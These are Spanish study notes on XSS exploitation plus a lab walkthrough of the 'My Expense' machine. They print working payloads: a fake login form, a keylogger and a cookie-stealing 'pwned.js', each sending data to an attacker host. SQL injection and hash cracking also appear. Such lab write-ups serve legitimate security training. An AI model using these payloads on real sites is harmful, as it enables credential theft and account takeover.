
-----------------
#vulnerabilidad #xss #explotacion 

------------

Permite a un atacante o a un tercero inyectar código JavaScript en una página web. Para practicar este ejercicio, clonamos el repositorio de GitHub de...

```bash
git clone https://github.com/globocom/SecDevLabs 
```

y posteriormente vamos a la ruta...

```bash 
cd SecDevLabs/Owasp-top-2021/a3/gossipKiller
make install
```

Si te permite ingresar contenido, prueba a ingresar código HTML o JavaScript para vulnerar los POST de código de la página. Se podría primeramente probar de la siguiente forma:

![[Pasted image 20240920135207.png]]

Posteriormente, lo que se hace es intentar ver si la página interpreta código de JavaScript para la inyección de código. Esto se puede probar de la siguiente forma:

![[Pasted image 20240920135517.png]]

Una vez con esta inyección, podemos crear scripts de phishing para recopilar datos o correos de usuarios. Algunos scripts podrían ser los siguientes:

![[Pasted image 20240920135944.png]]

----------

### Código 

```js
<div id="formContainer"></div>

<script>
var email;
var password;
var form = '<form>' +
  'Email: <input type="email" id="email" required>' +
  ' Contraseña: <input type="password" id="password" required>' +
  '<input type="button" onclick="submitForm()" value="Submit">' +
  '</form>';

document.getElementById("formContainer").innerHTML = form;

function submitForm() {
  email = document.getElementById("email").value;
  password = document.getElementById("password").value;
  fetch("http://ipAtacante/?email=" + email + "&password=" + password);
}
</script>

```

La clave es juntar el XSS con la ingeniería social. También puedes crear un Keylogger de la siguiente forma:

![[Pasted image 20240920140933.png]]

```js
<script>
var k = "";

document.onkeypress = function(e) {
  e = e || window.event;
  k += e.key;
  var i = new Image();
  i.src = "http://IpAtacante/" + k;
};
</script>

```

Luego, simplemente abres un servidor al que te van a llegar todas las peticiones con el método GET de la siguiente forma:

```bash
python3 -m http.server 80
```

Así pues, si quieres que el keylogger se vea mucho mejor jugando con controladores de texto, puedes activarlo de la siguiente forma:

![[Pasted image 20240920141905.png]]

También podrías redireccionar personas a cualquier enlace que quieras de la siguiente forma:

![[Pasted image 20240920143149.png]]

Para ver la cookie de sesión de alguna página web, puedes darle a inspeccionar el código HTML de la página, luego irte a "Application", "Storage" y posteriormente ver la cookie de sesión. Si lo que quieres es robarla, deshabilita el servicio HTTPS de su casilla (Chrome). De la siguiente forma lo puedes ver:

![[Pasted image 20240920144208.png]]

O también, otro modo que puedes hacerlo es entrar al modo consola de la página web y escribir el siguiente comando en JavaScript:

```js
alert(document.cookie);
```
 y se te mostrara el token de sesión:
 
 ![[Pasted image 20240920144520.png]]

Este es un script que te puedes montar para luego publicarlo en la página, que roba las cookies de sesión y te las envía a tu servidor:

![[Pasted image 20240920144915.png]]

Si quieres acceder mediante la cookie de sesión, lo tienes que hacer mediante un navegador como Chrome o Burp Suite, copiando el nombre de usuario y su cookie de sesión. Cabe aclarar que no en todas las páginas web funciona y que está más dirigido hacia [[Magento]].

Vamos a realizar una primera máquina, la máquina "My Expense". Para esto, primero lanzamos un ping para reconocer qué valor tienen el TTL y ante qué máquina nos estamos enfrentando. En este caso, el TTL es 64, así que es una máquina Linux.

Posteriormente, aplicamos un reconocimiento en forma de escaneo con la aplicación de Nmap de la siguiente forma:

![[Pasted image 20240920211535.png]]

donde:

- `-p-` es para indicar todos los puertos.
- `--open` es para indicar los que están abiertos solamente.
- `-sS` es para indicar un escaneo sigiloso.
- `--min-rate 5000` es para indicar que quiero 5000 paquetes por segundo.
- `-vvv` es para que nos reporte qué está pasando.
- `-n` no quiero resolución de DNS.
- `-Pn` no quiero que me descubra los hosts.
- `ip` es la dirección IP del objetivo.
- `-oG` exporta el escaneo a un archivo.

Una vez hecho esto, con el comando `extractPorts`, previamente definido como script en la ruta `/bin/bash`.


```bash
extractPorts () {
    ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
    ip_address="$(cat $1 | grep -oP '^Host: .* \(\)' | head -n 1 | awk '{print $2}')"
    echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
    echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
    echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
    echo $ports | tr -d '\n' | xclip -sel clip
    echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
    cat extractPorts.tmp
    rm extractPorts.tmp
}
```

hacemos lo siguiente:

```bash 
extractPorts allPorts
```

Y ahora, después de ver los puertos desplegados, lanzaremos el siguiente código de reconocimiento de Nmap:

![[Pasted image 20240920213022.png]]

en donde:

- `-sCV` son scripts de reconocimiento lanzados para detectar el servicio y la versión.
- `-p` especifica los puertos tratados.
- `-oN` exporta el archivo en formato Nmap a "targeted".

Posteriormente, realizamos un fuzz para ubicar qué directorios tiene disponible la página. Para eso, usamos Gobuster con el siguiente comando:

![[Pasted image 20240920213705.png]]

Una vez encontrados los directorios, nos quedamos con el directorio "admin" y realizamos un fuzzeo para que nos reconozca todos los tipos de archivos en formato PHP. Esto lo realizamos de la siguiente forma, añadiendo el directorio que queremos fuzzear y el `-x php`:

![[Pasted image 20240920214025.png]]

Posteriormente, intentamos autenticar en el terminal. Como no nos deja, nos creamos un usuario, pero como solo permite habilitar el usuario internamente, editamos el código HTML en el botón de "Sign Up" y le borramos la opción **disabled**, de la siguiente forma. Después de esto, nos dejaría crear el usuario:

![[Pasted image 20240920215139.png]]

Después de haber hecho esto, podemos ver en el panel de `/admin/admin.php` que el usuario está correctamente registrado.

Una vez hecho esto, probamos en el panel de autenticación si el formulario tiene vulnerabilidades de XSS de la siguiente forma:

![[Pasted image 20240920215641.png]]

Y como vemos en la siguiente foto del panel `/admin/admin.php`, es susceptible a explotación vía XSS:

![[Pasted image 20240920215822.png]]

Una vez que ya sabes que es susceptible a vulnerabilidades XSS, lo que hacemos es realizar un script en la página que lo lleve a una fuente de nuestro servidor para descargarse un archivo JS de la siguiente manera, con el `src` apuntando a nuestra IP de atacante:

![[Pasted image 20240920220959.png]]

Una vez hecho esto, abrimos un servidor con `python3 -m http.server 80` y esperamos que alguien se loguee para, primero, ver si hay actividad de usuarios y, segundo, empezar a construir el script `pwned.js` para que robe cookies de sesión. El script `pwned.js` se tendría que ver de la siguiente forma:

```js
var request = new XMLHttpRequest();
request.open('GET', 'http://ipAtacante/?cookie=' + document.cookie);
request.send();

```

Una vez hecho el script, abrimos el servidor y esperamos que alguien ingrese para que nos devuelva su cookie de sesión:

![[Pasted image 20240920221800.png]]

Con la cookie de sesión, lo único que hacemos es ir al panel de autenticación y cambiar nuestra cookie de sesión por la cookie robada de la siguiente forma:

![[Pasted image 20240920221921.png]]

Probamos y recargamos la página a ver si funciona el ingreso de la sesión, y si vemos que no funciona, tocaría hacerlo de otro método. El método que emplearemos es editar el archivo `pwned.js` para que, en vez de darnos una cookie de sesión, se establezca un comando para la activación de la cuenta desde la cuenta del administrador sin que se dé cuenta, de la siguiente forma:

![[Pasted image 20240920222755.png]]

Posteriormente, activamos el servidor con `python3 -m http.server 80` y esperamos que se realice la petición de la activación de la cuenta de la siguiente forma:

![[Pasted image 20240920223034.png]]

Una vez activada, nos logueamos con las credenciales que tenemos. Si no nos deja loguear, es porque tenemos la cookie de sesión de otra manera, así que toca volver a reiniciar el navegador para que ya nos sirva.

Una vez adentro, enviamos el reporte de pago al administrador.

![[Pasted image 20240920224053.png]]

que según nuestra cuenta es:

![[Pasted image 20240920224123.png]]

Una vez ingresados, como ya tenemos una sesión activa, lo que debemos hacer es poner en el panel principal un script para enviarlos a nuestro archivo `pwned.js` y, a su vez, editar el archivo para que se adapte al robo de las cookies como lo hicimos anteriormente de la siguiente forma:

![[Pasted image 20240920224756.png]]

Una vez hecho esto, editamos el archivo `pwned.js` para que ahora sea para robar cookies de sesión. Levantamos el servidor de escucha, ambos lo lanzamos por un puerto diferente al 80 para que no entre en conflicto con scripts anteriormente lanzados, y en este caso escuchamos en el puerto 4646 y obtenemos las cookies de sesión. Con las cookies de sesión, entramos a la cuenta que tenemos logueada y cambiamos la cookie.

![[Pasted image 20240920225620.png]]

Una vez hecho esto, ya seremos otro usuario, en este caso "Mano Riviere", que aceptará el pago. Una vez hecho esto, y viendo que el usuario superior al nuestro no cae en la trampa, procedemos a ver vulnerabilidades en un apartado de la página web para explotarlas con [[SQLI]].

![[Pasted image 20240920230542.png]]

Hay veces en las que toca usar la comilla para comentar el resto de la query, en este caso no.

Una vez conseguidas las contraseñas y los usuarios a través de la explotación de SQL, lo que hacemos es crackear las contraseñas en la página web hashes.com y lograr romperlas en texto claro.

![[Pasted image 20240920231946.png]]

Una vez encontradas las contraseñas, nos logueamos y aceptamos el pago, y podemos hacer lo que queramos con todos los usuarios y contraseñas.